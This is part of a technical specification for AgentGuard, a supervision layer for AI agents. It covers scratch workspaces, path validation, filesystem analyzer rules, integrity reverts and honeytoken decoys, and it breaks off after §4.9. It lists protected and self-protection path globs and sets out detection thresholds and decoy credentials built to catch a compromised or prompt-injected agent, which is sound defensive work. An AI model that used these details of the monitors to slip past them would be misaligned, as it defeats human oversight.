# AGENTGUARD — Technical Specification & Implementation Master Document
## PART 2 of N — Amendments to Part 1 (§0.A), Filesystem & Workspace Guard (§4), GUI / Browser Guard (§5), Rule Packs & Signed Feeds (§6)

> **Read Part 1 first.** Everything in Part 1 §0 (conventions, enums, `Finding`, `ExecutionResult`, ledger envelope, fail-closed doctrine, Protocols) applies here unchanged unless §0.A below explicitly amends it.
> **Rules for the implementing agent** are identical to Part 1: no invented names, thresholds come from config/policy, fail closed, every MUST has a test.
> **Scope tiers.** Each section marks work as **[MVP]** (needed for a working demo), **[SHOULD]**, or **[MAY]**. Build all MVP items first.

---

# §0.A — AMENDMENTS TO PART 1 (binding)

## A1. New pipeline stage `P3.5 PREFETCH` (amends Part 1 §1.5.2)
Analyzers are pure and I/O-free (Part 1 §0.11). Some analyses need facts from the world (file stat, current page element). Add an **async prefetch stage** between P3 and P4:

```python
class Prefetcher(Protocol):
    handles: frozenset[ActionType]
    timeout_ms: int
    async def prefetch(self, ctx: AnalysisContext) -> dict[str, Any]: ...   # result stored in ctx.scratch[self.key]
    key: str                                                                  # "fs" | "gui"
```
Rules: run under the per-run lock; each prefetcher capped by `timeout_ms` (FS 50, GUI 150); exception or timeout → `Finding(source="hub", rule_id="HUB-009", reason ANALYZER_ERROR|ANALYZER_TIMEOUT, severity 60|55, ASK_HUMAN)` and analyzers for that type still run with `ctx.scratch[key] = None` (they MUST handle `None` by emitting their own ASK_HUMAN finding, fail-closed). Prefetchers are **read-only** (no side effects).

## A2. `ArtifactBuilder` at P7 (amends Part 1 §1.5.2 P7)
```python
class ArtifactBuilder(Protocol):
    handles: frozenset[ActionType]
    def build(self, ctx: AnalysisContext, findings: list[Finding]) -> dict[str, Any]: ...   # → Approval.artifacts (≤ 256 KB serialized)
```
Called only when a `PENDING_APPROVAL` is created. Output keys are type-specific and documented per section (`fs` → `diff`, `gui` → `screenshot`, `cli` → `ir`). Builders MUST redact via `Redactor` (§6.9).

## A3. Proxy identity `system:feeds` (amends Part 1 §3.4)
The hub has no direct internet route. Rule-feed sync (§6.6) sends its HTTP requests through the egress proxy with `Proxy-Authorization` for identity `system:feeds` (token = `HMAC(AG_SERVER_SECRET, "system:feeds")[:32]`). The proxy treats this identity specially: **only** GET/HEAD to hosts in `policy.rules.feed_allow_domains` (exact list, default `[]`), no rate limit change, no run-status check, events logged with `run_id=null`, `source="proxy"`.

## A4. Registry additions

**ActionType (append):** `GUI_SNAPSHOT="gui.snapshot"`, `GUI_SELECT="gui.select"`, `GUI_PRESS="gui.press"`.

**Ledger event types (append):** `workspace.created`, `workspace.integrity_violation`, `workspace.promoted`, `workspace.discarded`, `honeytoken.triggered`, `gui.dialog`, `gui.popup_blocked`, `rulepack.state_changed`, `trust.key_changed`.

**Reason codes (append):**
| Group | Codes |
|---|---|
| Hub | `COMPROMISE_SUSPECTED`, `WORKSPACE_TOO_LARGE`, `HOST_PATH_NOT_ALLOWED` |
| FS (§4) | `FS_PATH_INVALID`, `FS_OUTSIDE_WORKSPACE`, `FS_SYMLINK_ESCAPE`, `FS_SENSITIVE_PATH`, `FS_PROTECTED_PATH`, `FS_SELF_PROTECTION`, `FS_HONEYTOKEN_ACCESS`, `FS_WIPE_SUSPECTED`, `FS_MASS_CHANGE`, `FS_QUOTA`, `FS_SECRET_IN_CONTENT`, `FS_SCRIPT_SUSPECT`, `FS_EXECUTABLE_BINARY`, `FS_INTEGRITY_REVERTED`, `FS_CONFLICT` |
| GUI (§5) | `GUI_RED_ZONE_DESTRUCTIVE`, `GUI_RED_ZONE_FINANCIAL`, `GUI_RED_ZONE_ADMIN`, `GUI_RED_ZONE_PUBLISH`, `GUI_CREDENTIAL_FIELD`, `GUI_DECEPTIVE_ELEMENT`, `GUI_OCCLUDED`, `GUI_ELEMENT_CHANGED`, `GUI_STALE_SNAPSHOT`, `GUI_FILE_UPLOAD`, `GUI_DOWNLOAD_BLOCKED`, `GUI_CROSS_ORIGIN_SUBMIT`, `GUI_RISKY_PAGE`, `GUI_SCHEME_DENIED`, `GUI_TYPED_SECRET`, `GUI_KEYBOARD_SHORTCUT`, `GUI_POPUP_BLOCKED`, `GUI_NAV_BLOCKED` |
| Rules (§6) | `RULEPACK_MATCH`, `RULEPACK_STALE`, `RULEPACK_ERROR` |

**Hub pre-check (append to P3):** `3f COMPROMISE`: if `run.flags.compromise_suspected` and `is_high_impact(action)` → `Finding(HUB-008, COMPROMISE_SUSPECTED, severity 75, ASK_HUMAN)`.

**Config (append to Part 1 §0.8):**

| Env var | Default | Meaning |
|---|---|---|
| `AG_ALLOWED_HOST_ROOTS` | `""` (empty = no host paths allowed) | colon-separated absolute dirs; `workspace_host_path` MUST be inside one, else run creation → 422 `HOST_PATH_NOT_ALLOWED` |
| `AG_WORKSPACES_DIR` | `${DATA_DIR}/workspaces` | per-run `scratch/` and `baseline/` |
| `AG_CAS_DIR` | `${DATA_DIR}/cas` | content-addressed store for protected-file versions |
| `AG_WORKSPACE_MAX_FILES` | 20000 | copy limit |
| `AG_WORKSPACE_MAX_BYTES` | 209715200 | copy limit (200 MiB) |
| `AG_BROWSER_IMAGE` | `agentguard/browser:latest` | §5 |
| `AG_TRUST_DIR` | `${DATA_DIR}/trust` | §6 |
| `AG_PACKS_DIR` | `${DATA_DIR}/packs` | §6 |
| `AG_ARTIFACTS_DIR` | `${DATA_DIR}/artifacts` | screenshots, diffs |

## A5. Run flags and new tables (amends Part 1 §1.2.1 and §1.3)
```python
class RunFlags(BaseModel):
    compromise_suspected: bool = False
    integrity_violations: int = 0
    honeytoken_hits: int = 0
    canary_hits: int = 0                  # incremented by NET-022 (Part 1 N-12); ≥2 → HALT
class Run(BaseModel):                     # add fields
    flags: RunFlags = RunFlags()
    workspace: WorkspaceState | None = None
```
SQL additions (`schema.sql`):
```sql
ALTER TABLE runs ADD COLUMN flags_json TEXT NOT NULL DEFAULT '{"compromise_suspected":false,"integrity_violations":0,"honeytoken_hits":0,"canary_hits":0}';
ALTER TABLE runs ADD COLUMN workspace_json TEXT;      -- WorkspaceState (§4.2)

CREATE TABLE workspace_snapshots (
  snapshot_id TEXT PRIMARY KEY,                        -- "snp_<ulid>"
  run_id TEXT NOT NULL REFERENCES runs(run_id),
  kind TEXT NOT NULL CHECK (kind IN ('baseline','post_action','final')),
  action_id TEXT, created_at TEXT NOT NULL,
  file_count INTEGER NOT NULL, total_bytes INTEGER NOT NULL,
  manifest_z BLOB NOT NULL                             -- zlib(canonical_json(manifest))
);
CREATE INDEX idx_snap_run ON workspace_snapshots(run_id, created_at);

CREATE TABLE egress_events (                           -- referenced by Part 1 §3.6
  event_id TEXT PRIMARY KEY, run_id TEXT, ts TEXT NOT NULL, host TEXT NOT NULL,
  decision TEXT NOT NULL, reason_codes_json TEXT NOT NULL, body_json TEXT NOT NULL CHECK (json_valid(body_json))
);
CREATE INDEX idx_egress_run ON egress_events(run_id, ts);
```
(§6 adds `rulepacks`, `rulepack_active`, `feeds`, `trust_keys`, `rule_hits`.)

## A6. Analyzer ordering (clarifies Part 1 P4)
Order per action: **prefetch (A1) → surface analyzer (`cli`|`net`|`fs`|`gui`) → `rules` analyzer (§6) → `policy` analyzer (§7, later)**. Surface analyzers publish artifacts into `ctx.scratch` (`cli_ir`, `fs`, `gui`, `net`) before `rules` runs; the `rules` analyzer reads them (surfaces §6.5).

## A7. Post-execution hooks (amends Part 1 P9)
```python
class IntegrityChecker(Protocol):        # §4.8
    async def after_exec(self, run: Run, action: ActionRecord, result: ExecutionResult) -> IntegrityReport: ...
```
Called for `cli.exec` only (skipped by the read-only optimization in §4.8.1). If `report.violations` is non-empty: set action `next_step=REPLAN`, add reason `FS_INTEGRITY_REVERTED` to the response, `run.flags.integrity_violations += 1` (≥ 2 → hub HALTs run, `halt_reason="INTEGRITY_VIOLATIONS"`), ledger `workspace.integrity_violation` (durable).

`ScriptRegistry` (used by Part 1 CLI-016): `run.vetted_scripts: dict[path, sha256]` populated by §4 when an `fs.write` of a script passes analysis (§4.6 step 9); consulted by the CLI analyzer via `ctx.history.vetted_scripts`. Entries are removed when the manifest hash for that path changes.

## A8. `Redactor` ownership
`Redactor` (Part 1 §3.7.1 mention) is specified in §6.9 and lives in `agentguard/rules/redactor.py`. Interface: `redact(text: str, *, surface: str) -> RedactionResult{text, kinds: list[str], count: int}`.

---

# §4 — FILESYSTEM & WORKSPACE GUARD

## 4.1 Purpose and architecture

Two cooperating mechanisms implement the "zero-trust storage" claim:

1. **Scratch workspace with baseline** — the agent never touches the user's real directory. At run start the hub creates a *scratch copy* (mounted read-write into the sandbox as `/workspace`) and an immutable *baseline copy* (never mounted anywhere). All agent effects land in scratch.
2. **Two approval gates** — (a) **action gate**: `fs.*` actions and `cli.exec` commands touching sensitive/protected paths are analyzed and may need human approval **with a diff**; (b) **promotion gate**: scratch changes reach the real directory only via an explicit, human-reviewed `promote` operation.

Plus **post-execution integrity checking**: after every non-read-only `cli.exec`, the hub computes a change set and *reverts* forbidden changes (protected files, escaping symlinks, setuid bits).

```
host_path (real project) ──copy at run start──► baseline/ (ro, hub-only) 
                     └──copy (minus secrets)──► scratch/ ──bind-mount──► sandbox:/workspace
agent fs.* ─► FsAnalyzer(pure, uses FsPrefetch) ─► ALLOW/ASK(+diff)/DENY ─► FsExecutor(no-follow, atomic) ─► scratch
agent cli.exec ─► §2 ─► exec in sandbox ─► IntegrityChecker (scan vs manifest, revert protected) 
human ─► GET /workspace/changes, /diff ─► POST /workspace/promote ─► real host_path (drift-checked, atomic per file)
```

## 4.2 Data models (`models/workspace.py`, `fs/`)

```python
class WorkspaceState(BaseModel):
    run_id: str
    mode: Literal["copy","empty"]
    host_path: str | None
    scratch_dir: str                       # host absolute path; mounted at task.workspace_root
    baseline_dir: str | None               # host absolute path; None if mode == "empty"
    created_at: str
    file_count: int; total_bytes: int
    excluded: list[str]                    # relative paths excluded from copy (secrets etc.), capped 200
    skipped_symlinks: list[str]
    honeytoken_paths: list[str]            # relative paths inside workspace
    baseline_snapshot_id: str
    last_snapshot_id: str
    promoted_at: str | None = None

class ManifestEntry(BaseModel):            # persisted compactly as list [k, sha256|"", size, mode, link_target|None]
    k: Literal["f","d","l"]; s: str; z: int; m: int; l: str | None = None

Manifest = dict[str, ManifestEntry]        # key = POSIX relative path (NFC-normalized, no leading "./")

class FileChange(BaseModel):
    path: str
    change: Literal["added","modified","deleted","mode_changed","symlink_added"]
    old_sha256: str | None; new_sha256: str | None
    old_size: int | None; new_size: int | None
    protected: bool; sensitive: bool; honeytoken: bool
    binary: bool

class ChangeSet(BaseModel):
    base_snapshot_id: str; head_snapshot_id: str
    files: list[FileChange]; totals: dict[str,int]      # {"added":n,"modified":n,"deleted":n,...}

class FsPolicy(BaseModel):                 # produced by §7; defaults below
    workspace_root: str = "/workspace"     # sandbox-side path
    read_allow_paths: list[str] = []       # extra read-only sandbox paths (outside workspace) allowed for fs.read/fs.list
    sensitive_path_globs: list[str]        # same list as CliPolicy.sensitive_path_globs (single source of truth in §7)
    deny_paths: list[str] = [".agentguard.yaml","**/.agentguard.yaml","policies/**","**/agentguard*.yaml","**/.agentguard/**"]   # self-protection
    protected_path_globs: list[str] = [".git/hooks/**",".git/config",".github/workflows/**",".gitlab-ci.yml",".circleci/**",
                                       "Jenkinsfile",".pre-commit-config.yaml",".husky/**","**/authorized_keys"]
    executable_ext: list[str] = [".sh",".bash",".py",".js",".mjs",".rb",".pl",".php",".ps1",".bat"]
    max_read_bytes: int = 1_048_576
    max_write_bytes: int = 5_242_880
    max_workspace_growth_bytes: int = 209_715_200
    max_list_entries: int = 1000
    max_path_len: int = 4096; max_component_len: int = 255; max_depth: int = 32
    mass_delete_threshold_files: int = 50
    wipe_shrink_ratio: float = 0.8          # overwrite shrinking a file (>512 B) by >80% → ASK
    copy_exclude_globs: list[str]           # default = sensitive globs + ["**/node_modules/**","**/.venv/**","**/venv/**","**/__pycache__/**","**/*.pyc","**/.DS_Store"]
    auto_promote_safe: bool = False         # if True, promote() without human for changes with no protected/sensitive/honeytoken/binary entries
    honeytokens_enabled: bool = True
    scan_script_content: bool = True
```

Prefetch payload `ctx.scratch["fs"]` (`FsFacts`):
```python
class FsFacts(BaseModel):
    rel_path: str | None                    # normalized relative path inside scratch, None if lexically outside
    exists: bool; kind: Literal["file","dir","symlink","other","missing"]
    symlink_escape: bool                    # any component (or final) is a symlink whose target leaves scratch
    size: int | None; mode: int | None
    sha256: str | None                      # only when size ≤ max_read_bytes
    old_text: str | None                    # ≤ 512 KiB decoded text for diff (fs.write / fs.delete of text file)
    is_binary: bool | None
    dir_file_count: int | None              # for fs.delete recursive / fs.list: capped count (stop at 10_000)
    workspace_growth_bytes: int             # current total_bytes - baseline total_bytes
    vetted_script: bool                     # path in run.vetted_scripts and hash matches
```

## 4.3 Workspace lifecycle (`fs/workspace.py`)

### 4.3.1 Creation (called from `POST /v1/runs` before the sandbox starts)
1. If `task.workspace_host_path` is `None` → mode `empty`: create empty `scratch_dir`; `baseline_dir=None`; empty baseline manifest.
2. Else: `host = os.path.realpath(host_path)`; must be a directory and inside one of `AG_ALLOWED_HOST_ROOTS` (compare with `os.path.commonpath`); else run creation fails `HOST_PATH_NOT_ALLOWED` (422). Reject if `host` itself is `/`, the home directory, or any of the roots.
3. Walk `host` with `os.scandir` (no symlink following). For each entry compute relative path (NFC). Apply `copy_exclude_globs` → record in `excluded` **and** register values of excluded secret-like files as canaries (Part 1 §3.7.4, read host-side; never exposed). Symlinks: copy only if the (lexically resolved, relative) target stays inside `host`; else skip and record in `skipped_symlinks`.
4. Enforce `AG_WORKSPACE_MAX_FILES` / `AG_WORKSPACE_MAX_BYTES` during the walk; exceeding → abort, delete partial dirs, run `FAILED` (`WORKSPACE_TOO_LARGE`).
5. Copy files to `scratch/` **and** `baseline/` using `shutil.copy2` (or `cp --reflink=auto` when available); preserve mode bits but **clear setuid/setgid/sticky** bits. Baseline directory tree: `chmod -R a-w`, owned by the hub user, never mounted into any container.
6. Files/dirs in `scratch/` are `chown 10001:10001` (sandbox uid) if the hub runs as root, else made world-writable within scratch (`chmod g+rwX,o+rwX` — acceptable because scratch is isolated per run).
7. Honeytokens (§4.9) planted into `scratch/` only (not baseline) **after** the baseline snapshot, so they appear as "added" and are filtered from promotion.
8. Compute baseline manifest → persist `workspace_snapshots(kind='baseline')`; store `WorkspaceState`; ledger `workspace.created` (counts, excluded count, **not** contents).

### 4.3.2 Manifest computation (`fs/manifest.py`)
`build_manifest(root, prev: Manifest|None, hash_cache) -> Manifest`: `os.scandir` recursive (no follow); entry key = relative POSIX path NFC; for files: `(size, mtime_ns)` compared to `hash_cache` — unchanged → reuse sha256 else rehash (SHA-256, 1 MiB chunks); symlinks → `k="l"`, `l=os.readlink`; directories `k="d"`. Skips `/.agentguard-internal/` if present. Hard limits: 50,000 entries → abort scan with `WORKSPACE_TOO_LARGE` violation → run HALT (fail-closed: cannot verify integrity).

### 4.3.3 Diff (`fs/diffing.py`)
`unified_diff(old: bytes|None, new: bytes|None, path) -> DiffResult{text, added, removed, truncated, binary}`:
- Binary if NUL in first 8 KiB or undecodable ≥ 5 % → return `{binary:true, old_sha256,new_sha256,old_size,new_size}`; no text.
- Text: decode `utf-8` (`errors="replace"`), `difflib.unified_diff(a.splitlines(True), b.splitlines(True), fromfile=f"a/{path}", tofile=f"b/{path}", n=3)`; cap output at 200 KB / 4000 lines, then append `\n[... diff truncated by AgentGuard ...]` and `truncated=true`. New file: `--- /dev/null`; deleted: `+++ /dev/null`. Passed through `Redactor` before returning.

## 4.4 API contracts

**`GET /v1/runs/{run_id}/workspace`** (admin) → `200`
```json
{"run_id":"run_...","mode":"copy","host_path":"/home/dev/projects/demo","file_count":412,"total_bytes":3812211,
 "excluded_count":3,"skipped_symlinks":[],"honeytoken_count":2,"promoted_at":null,
 "changes":{"added":2,"modified":3,"deleted":0,"mode_changed":0,"symlink_added":0,"protected":0,"sensitive":0}}
```
**`GET /v1/runs/{run_id}/workspace/changes`** (admin) → `ChangeSet` JSON (fresh scan vs baseline; ≤ 1000 files listed, `truncated` flag otherwise).
**`GET /v1/runs/{run_id}/workspace/diff?path=src/utils.py`** (admin) → `200 {"path":"src/utils.py","change":"modified","diff":"--- a/src/utils.py\n+++ b/src/utils.py\n@@ ...","added":3,"removed":1,"truncated":false,"binary":false}`. `path` MUST pass `FsPathValidator` (no `..`, relative).
**`POST /v1/runs/{run_id}/workspace/promote`** (admin) → `200`
```json
// request
{"paths":["src/utils.py","tests/test_utils.py"],   // null = all promotable changes
 "approved_by":"alice","note":"reviewed diff",
 "acknowledge":{"protected":[],"sensitive":[],"binary":["assets/logo.png"]},   // explicit per-file acks required for those classes
 "force":false}
// response
{"promoted":["src/utils.py","tests/test_utils.py"],"skipped":[{"path":"assets/logo.png","reason":"binary_not_acknowledged"}],
 "conflicts":[],"ledger_idx":914}
```
Errors: `409 FS_CONFLICT` with `details.conflicts=[{"path":..,"reason":"host_changed_since_baseline"}]` when `force=false` and any target's host hash ≠ baseline hash; `409 INVALID_STATE` if run status ∈ {CREATED}; promotion is allowed for RUNNING, COMPLETED, HALTED (review after halt is a feature), not for ABANDONED after `discard`.
**`POST /v1/runs/{run_id}/workspace/discard`** (admin) → deletes `scratch/`, keeps `baseline/` + ledger; ledger `workspace.discarded`.
**`POST /v1/debug/analyze/fs`** (admin): body `{"action_type":"fs.write","params":{...},"facts":{...FsFacts optional...}}` → verdict + findings (facts supplied by caller for pure testing).

**Action result shapes** (`ExecutionResult.meta`):
- `fs.read`: `stdout` = decoded text (redacted, ≤ `max_read_bytes`); `meta={"path","size","sha256","encoding":"utf-8","binary":false,"truncated":false}`; binary → `stdout=""`, `meta.binary=true, meta.content_omitted=true`.
- `fs.list`: `stdout` = newline-joined names (dirs suffixed `/`); `meta.entries=[{"name","type","size","mtime"}]` (≤ `max_list_entries`), `meta.truncated`.
- `fs.write`: `meta={"path","bytes_written","sha256","created":bool,"mode":"overwrite"}`.
- `fs.delete`: `meta={"path","deleted_files":n,"deleted_dirs":m}`.
- Errors (`status:"FAILED"`): `meta.error ∈ {"NOT_FOUND","EXISTS","NOT_A_FILE","NOT_A_DIR","SYMLINK_REFUSED","TOO_LARGE","IO_ERROR"}` (mode `create` + exists → `EXISTS`).

`fs.read` output is scanned by the taint scanner (Part 1 §3.8.1): `output_tainted = (level == 2)` only (level 1 ignored to limit false positives on documentation/test files); reasons recorded.

## 4.5 Path validation and safe I/O (`fs/paths.py`, `fs/safeio.py`)

### 4.5.1 `FsPathValidator.normalize(p, workspace_root) -> (rel_path | None, findings)` — pure, lexical
1. Reject if `p` contains `\x00` or C0 controls, or is empty, or `len > max_path_len` → `FS-001` `FS_PATH_INVALID` sev 80 DENY.
2. If `p` is absolute: must be `workspace_root` or start with `workspace_root + "/"` (also allow `read_allow_paths` for read-type actions); else `FS-002` `FS_OUTSIDE_WORKSPACE` sev 85 DENY. Relative paths are joined to `workspace_root`.
3. `posixpath.normpath`; re-check containment (this is what defeats `..` traversal); components: none may exceed `max_component_len` or contain control chars, trailing space/dot, or Windows-reserved names (`CON`,`NUL`, …) → `FS-001`. Depth > `max_depth` → `FS-001`.
4. Unicode: NFC-normalize; if NFKC(name) ≠ NFC(name) for any component, or mixed-script → `FS-001` sev 70 DENY (confusable filenames, e.g. fullwidth `．env`).
5. `rel_path` = path relative to `workspace_root` (`""` for the root itself).

### 4.5.2 Glob matching (`match_globs(rel_path, globs, *, case_insensitive=True)`)
Implement `**` semantics: `**/` matches zero or more directories; `*` does not cross `/`; `?` one char; matching is case-insensitive and applied to the NFC-lowercased path and to every ancestor prefix (so `.git/hooks/**` matches `.git/hooks/pre-commit` and `.GIT/Hooks/x`). Provide `is_sensitive`, `is_protected`, `is_denied`, `is_honeytoken`.

### 4.5.3 `SafeFs` (used by executor and prefetch): all operations relative to an open **directory file descriptor** for `scratch_dir`
```python
def open_no_follow(root_fd, rel, flags, mode=0o600) -> int:
    parts = rel.split("/"); fd = os.dup(root_fd)
    for comp in parts[:-1]:
        nfd = os.open(comp, os.O_RDONLY | os.O_DIRECTORY | os.O_NOFOLLOW, dir_fd=fd); os.close(fd); fd = nfd
    return os.open(parts[-1], flags | os.O_NOFOLLOW | os.O_CLOEXEC, mode, dir_fd=fd)
```
`ELOOP`/`ENOTDIR` on a component ⇒ raise `SymlinkRefused` (maps to `meta.error="SYMLINK_REFUSED"`). Writes: create temp name `.ag-tmp-<ulid>` in the target directory (`O_CREAT|O_EXCL|O_WRONLY`), write, `fsync`, `os.replace` via `renameat`-equivalent (`os.rename(src, dst, src_dir_fd=fd, dst_dir_fd=fd)`), `fsync` the directory. Mode: preserve existing file mode for overwrite; new files `0o644` (`0o755` never set by the guard; executables come from CLI `chmod`). `mkdir -p` implemented by iterative `os.mkdir(comp, dir_fd=fd)` with `EEXIST` tolerated, depth-capped. Deleting: `os.unlink`/`os.rmdir` with dir_fd; recursive delete = iterative post-order walk using `os.scandir(fd)`, never following symlinks (unlink the link itself).

## 4.6 Analyzer rules (`fs/analyzer.py`, `FsAnalyzer.handles = {fs.read, fs.list, fs.write, fs.delete}`, timeout 50 ms)

Inputs: `ctx.action.params`, `ctx.scratch["fs"]: FsFacts|None`, `policy.fs`, `ctx.run.workspace`, `ctx.history.vetted_scripts`. **If `facts is None`** → `Finding(FS-000, ANALYZER_ERROR, 60, ASK_HUMAN)` and stop.

Evaluate in this order; collect all findings (do not short-circuit, except after `FS-001/002/003` DENY where later steps are skipped because the path is untrustworthy):

| ID | Applies to | Condition | Verdict / sev | Reason code |
|---|---|---|---|---|
| FS-001 | all | path invalid (4.5.1 steps 1,3,4) | D / 80 | `FS_PATH_INVALID` |
| FS-002 | all | outside workspace (4.5.1 step 2/3) | D / 85 | `FS_OUTSIDE_WORKSPACE` |
| FS-003 | all | `facts.symlink_escape` | D / 90 | `FS_SYMLINK_ESCAPE` |
| FS-005 | write, delete | path matches `deny_paths` (self-protection: agent may never modify its own policy/guard config) | D / 95 | `FS_SELF_PROTECTION` |
| FS-012 | all | path is a honeytoken (4.9) | D / 95 + set flag | `FS_HONEYTOKEN_ACCESS` |
| FS-010 | read, list(recursive into sensitive), write, delete | path matches `sensitive_path_globs`: inside workspace and `.env*` with `ask_on_workspace_secret_files` → A / 55; otherwise D / 88 | | `FS_SENSITIVE_PATH` |
| FS-011 | read | `params.max_bytes > policy.max_read_bytes` → clamp (no finding); `facts.size > max_read_bytes` → result truncated (no finding); `facts.kind != "file"` → executor returns `NOT_A_FILE` (no finding) | — | — |
| FS-013 | list | `recursive=True` on workspace root or any dir with `dir_file_count > max_list_entries` → clamp + `truncated` (no finding) | — | — |
| FS-020 | write, delete | path matches `protected_path_globs` | A / 65 (+ diff artifact) | `FS_PROTECTED_PATH` |
| FS-021 | write | decoded content size > `max_write_bytes` | D / 70 | `FS_QUOTA` |
| FS-022 | write | `facts.workspace_growth_bytes + size > max_workspace_growth_bytes` | D / 75 | `FS_QUOTA` |
| FS-023 | write (overwrite) | `facts.exists` and `facts.size > 512` and `new_size < facts.size * (1 - wipe_shrink_ratio)`, **or** new content is empty/whitespace-only and `facts.size > 0` | A / 55 (+ diff) | `FS_WIPE_SUSPECTED` |
| FS-024 | write (create) | mode `create` and `facts.exists` → no finding (executor returns `EXISTS`) | — | — |
| FS-030 | write | `Redactor`/scanner detects secrets in content (Part 1 §3.7.1 kinds `aws_*`,`private_key`,`github_token`,`slack_token`,`jwt`,`generic_api_key`) | A / 60 (DENY / 85 for `private_key` and for **canary** values) | `FS_SECRET_IN_CONTENT` |
| FS-031 | write | `scan_script_content` and (extension ∈ `executable_ext` or content starts with `#!`): analyze content — shell scripts (`.sh/.bash` or shebang `sh|bash|zsh|dash`) via `CliAnalyzer.analyze_script(text)` (each non-comment line group parsed as a command list); python/js/others via the CLI-015 inline-code regex scan (Part 1 §2.5). Any finding with verdict ≥ ASK → emit `FS-031` with `severity = min(70, max child severity)`, verdict **ASK_HUMAN**, `evidence.child_rules=[...]`; **and** do NOT register the script as vetted | A / ≤ 70 | `FS_SCRIPT_SUSPECT` |
| FS-032 | write | content begins with magic `\x7fELF`, `MZ`, `\xca\xfe\xba\xbe`, `\xfe\xed\xfa\xce/\xcf`, `\xcf\xfa\xed\xfe` | D / 85 | `FS_EXECUTABLE_BINARY` |
| FS-040 | delete | recursive and (`path` is workspace root **or** `.git` **or** `dir_file_count > mass_delete_threshold_files`) | A / 60 | `FS_MASS_CHANGE` |
| FS-041 | delete | recursive delete of non-empty dir below threshold | A / 45 | `FS_MASS_CHANGE` |
| FS-042 | delete | single file, non-protected, non-sensitive | none (allowed) | — |
| FS-043 | delete | `kind == "missing"` | none (executor `NOT_FOUND`) | — |
| FS-050 | write | path is a **new** symlink target? n/a (symlinks cannot be created via `fs.write`) | — | — |

Post-analysis bookkeeping (in analyzer output `evidence`, consumed by hub): `ctx.scratch["fs_result"] = {"vetted_candidate": bool(script and FS-031 not fired and no verdict ≥ ASK)}`. The hub, after a **successful** write execution, records `run.vetted_scripts[rel_path] = sha256(content)` iff `vetted_candidate`.

**Artifact builder** (`Approval.artifacts` for `fs.write`/`fs.delete` ASK): `{"kind":"fs","path":rel,"change":"modified|added|deleted","diff":<unified diff>,"added":n,"removed":n,"truncated":bool,"old_sha256":..,"new_sha256":..,"binary":false}`; for recursive delete: `{"kind":"fs","path":rel,"change":"deleted_tree","file_count":n,"sample":[first 25 relative paths]}`.

## 4.7 Executor (`fs/executor.py`, `FsExecutor.handles = {fs.read, fs.list, fs.write, fs.delete}`)
Uses `SafeFs` (4.5.3) rooted at `scratch_dir`; **re-validates everything** independent of the analyzer (defense in depth): re-run `FsPathValidator`, re-stat via no-follow open; any mismatch with prefetched facts (e.g., path became a symlink, file changed hash since prefetch and the action was approved) → `status="FAILED"`, `meta.error="SYMLINK_REFUSED"|"CHANGED_SINCE_APPROVAL"`, no write. For approved `fs.write` with prior hash `facts.sha256`: compare-and-swap — write only if current sha256 equals `facts.sha256` captured at decision time (else `CHANGED_SINCE_APPROVAL`), guaranteeing the human approved the diff that actually applies.
Execution mutex: same per-run exec mutex as `cli.exec` (Part 1 F-10). After success: append a `post_action` snapshot **incrementally** (update manifest entry for that path only) and, for protected/sensitive-approved writes, store the new content in the CAS (`AG_CAS_DIR/<sha[:2]>/<sha>`) so it becomes the reference for integrity reverts.

## 4.8 Post-execution integrity checker (`fs/integrity.py`)

### 4.8.1 When to run
After every `cli.exec` **except** when *all* of: (a) `ctx.scratch["cli_ir"]` shows every command basename ∈ `READONLY_CMDS = {ls,cat,grep,rg,head,tail,wc,pwd,echo,printf,which,date,stat,file,sha256sum,md5sum,diff,cut,tr,sort,uniq,basename,dirname,true,false,test,jq,git(status|diff|log|show|branch(list)|rev-parse)}`; (b) there are no output redirects other than `/dev/null`, `/dev/stdout`, `/dev/stderr`; (c) no command is path-qualified. Skipped runs still cost nothing; all others do an incremental scan (target ≤ 150 ms for 20k files with cache; report measured).

### 4.8.2 Algorithm
```
1. new = build_manifest(scratch, prev=run.last_manifest, cache)         # 4.3.2
2. cs = diff_manifests(run.last_manifest, new)                          # added/modified/deleted/mode_changed/symlink_added
3. violations = []
   for each change c:
     a. path matches deny_paths (self-protection)         → REVERT_FROM_BASELINE_OR_DELETE, reason FS_SELF_PROTECTION, sev 95
     b. path matches protected_path_globs (and not approved earlier in this run: reference = CAS/approved manifest)
                                                          → REVERT to reference content (delete if added), reason FS_PROTECTED_PATH, sev 80
     c. new symlink whose target resolves outside scratch   → DELETE symlink, reason FS_SYMLINK_ESCAPE, sev 90
     d. mode has setuid/setgid bit                           → chmod to (mode & 0o777 & ~0o111 if new file else previous mode), reason FS_PROTECTED_PATH, sev 70
     e. path is honeytoken and modified/deleted/read-marker (atime not tracked) → record honeytoken.triggered (sev 95), restore from CAS
     f. new file with ELF/Mach-O/PE magic                    → violation only (no revert; binaries may be legitimate build output): reason FS_EXECUTABLE_BINARY, sev 60, verdict ASK-level flag
     g. |cs.added| + |cs.modified| + |cs.deleted| > 200      → violation FS_MASS_CHANGE sev 55 (flag only)
     h. total_bytes growth > max_workspace_growth_bytes      → violation FS_QUOTA sev 75; run HALT (disk exhaustion guard)
4. apply reverts (SafeFs); rebuild manifest entries for reverted paths; run.last_manifest = new (post-revert)
5. persist post_action snapshot when cs non-empty; return IntegrityReport{changes: cs, violations:[{path, rule, reason_code, severity, reverted: bool}]}
```
A protected-path change is "approved earlier" iff the CAS holds a version whose hash equals the new hash **and** the approvals table has an APPROVED action whose `params_hash` corresponds to an `fs.write` of that path. (CLI-made changes to protected files are therefore always reverted; the agent must use `fs.write` so a human sees the diff.)
Failure of the scan itself (exception, timeout 2 s, > 50k entries) → violation `FS_QUOTA`-class `ANALYZER_ERROR`, run status `PAUSED` (fail closed: integrity unverifiable), ledger event, admin must resume.

## 4.9 Honeytokens (`fs/honeytokens.py`) **[SHOULD]**
Purpose: high-signal compromise detector — legitimate task work never needs decoy secrets, so any access is strong evidence of a hijacked/injected agent.
- On workspace creation (if enabled) plant 2 files in `scratch/` (never in baseline): `.env.backup` and `config/prod_credentials.json.bak`, with generated **fake** values: AWS key `AKIA` + 16 random `[A-Z0-9]`, 40-char secret, `DATABASE_URL=postgres://admin:<24 random>@db.internal.example:5432/prod`, a fake GitHub token `ghp_` + 36 random alnum. Register every value (and encoded variants) as canaries (Part 1 §3.7.4) and record paths in `WorkspaceState.honeytoken_paths`.
- **Access = any of**: `fs.read/list-target` of those paths (FS-012), CLI argv/redirect referencing them (CLI-030 extended: `paths.is_honeytoken` ⇒ `CLI-032` `FS_HONEYTOKEN_ACCESS`, D / 95), egress payload containing a honeytoken value (Part 1 NET-022).
